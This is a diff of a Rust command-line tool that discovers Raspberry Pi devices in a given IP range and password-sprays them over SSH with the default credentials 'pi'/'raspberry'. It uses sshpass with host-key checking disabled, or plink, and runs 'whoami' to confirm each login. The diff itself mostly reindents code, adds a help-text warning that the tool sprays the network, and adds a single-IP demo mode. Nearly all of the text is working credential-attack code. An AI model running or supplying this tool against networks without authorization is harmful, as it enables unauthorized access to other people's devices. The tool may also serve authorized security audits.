@@ -3,6 +3,7 @@ use std::process::{Command,Stdio};
 use colored::*;
 use std::io::Write;
 
+
 static DEFAULT_USERNAME: &str = "pi";
 static DEFAULT_PASSWORD: &str = "raspberry";
 
@@ -11,7 +12,7 @@ static DEFAULT_PASSWORD: &str = "raspberry";
 struct Cli {
 
     #[clap(short, long)]
-    ///Specify an ip range to scan. E.g. 192.0.0-255.0-255 or 192.0.0.0-255
+    ///Specify an ip range to scan. E.g. 192.0.0-255.0-255 or 192.0.0.0-255. THIS WILL PASSWORD SPRAY THIS NETWORK RANGE, USE -d FOR DEMONSTRATION.
     network_range: String,
     
     #[clap(short, long)]
@@ -85,7 +86,7 @@ fn get_ips(network_range: String) -> Vec<String> {
         count += 1;
     }
 
-    println!("Found {} raspberry pi's", ips.len().to_string().red());
+    println!("Found {} raspberry pi's", ips.len().to_string().bright_red());
     return ips;
 }
 
@@ -94,15 +95,15 @@ fn spray(ips: Vec<String>) {
     for ip in ips {
         print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
         let ssh = Command::new("sshpass")
-                      .arg("-p")
-                      .arg(DEFAULT_PASSWORD)
-                      .arg("ssh")
-                      .arg("-o")
-                      .arg("StrictHostKeyChecking no")
-                      .arg(format!("{}@{}", DEFAULT_USERNAME,  ip))
-                      .arg("whoami")
-                      .output()
-                      .expect("Tried to run 'sshpass -p DEFAULT_PASSWORD ssh -o 'StrictHostKeyChecking no' DEFAULT_USERNAME@IP whoami' but failed.");
+                          .arg("-p")
+                          .arg(DEFAULT_PASSWORD)
+                          .arg("ssh")
+                          .arg("-o")
+                          .arg("StrictHostKeyChecking no")
+                          .arg(format!("{}@{}", DEFAULT_USERNAME,  ip))
+                          .arg("whoami")
+                          .output()
+                          .expect("Tried to run 'sshpass -p DEFAULT_PASSWORD ssh -o 'StrictHostKeyChecking no' DEFAULT_USERNAME@IP whoami' but failed.");
         
         let ssh_output = String::from_utf8_lossy(&ssh.stdout);
         if (ssh_output.contains(DEFAULT_USERNAME)){
@@ -122,14 +123,14 @@ fn spray(ips: Vec<String>) {
     for ip in ips {
         print!("[{}] {}\r", "~".truecolor(169,169,169), ip);
         let ssh = Command::new("plink")
-                        .arg("-ssh")
-                        .arg(format!("{}@{}", DEFAULT_USERNAME, ip))
-                        .arg("-pw")
-                        .arg(DEFAULT_PASSWORD)
-                        .arg("-m")
-                        .arg("whoami.txt")
-                        .output()
-                        .expect("ssh failed to start");
+                          .arg("-ssh")
+                          .arg(format!("{}@{}", DEFAULT_USERNAME, ip))
+                          .arg("-pw")
+                          .arg(DEFAULT_PASSWORD)
+                          .arg("-m")
+                          .arg("whoami.txt")
+                          .output()
+                          .expect("ssh failed to start");
         let ssh_output = String::from_utf8_lossy(&ssh.stdout);
         if (ssh_output.contains(DEFAULT_USERNAME)){
             println!("[{}] {}", "+".bright_green(), ip);
@@ -144,7 +145,8 @@ fn spray(ips: Vec<String>) {
 fn main() {
     check_external_dependencies();
     let args = Cli::parse();
-    let ips = get_ips(args.network_range);
+    let mut ips = get_ips(args.network_range);
+    if (!args.demo.is_none()) { ips = vec![args.demo.unwrap()]; }
     spray(ips);
 }
 
